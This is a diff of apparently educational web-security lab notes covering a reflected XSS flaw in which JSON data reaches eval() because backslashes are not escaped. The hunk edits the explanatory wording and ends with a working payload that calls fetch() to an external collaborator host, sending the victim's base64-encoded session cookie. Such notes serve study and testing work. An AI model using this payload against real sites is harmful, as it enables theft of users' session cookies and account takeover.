@@ -190,9 +190,9 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
 
 ### Reflected XSS (Cookie Stealers)  
 
->In the Search function on webapp a Reflected XSS is identified, then deliver exploit link to victim with cookie stealing payload in hosted **iframe** on exploit server.  
+>In the Search function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  
 
->The search JavaScript code on the target is using the data in JSON reflected response, that is then send to **eval()** function, and not sanitizing ** \ ** escape proper user input.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
+>The search JavaScript code on the target is using the data in JSON reflected response, that is then send to **eval()** function, and not sanitizing **\\** escape proper user input.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  
 
 ```JavaScript
 \"-fetch('https://b6iekvt4bvzgy50anfk4rb1oifo6cy0n.oastify.com?cs='+btoa(document.cookie))}//
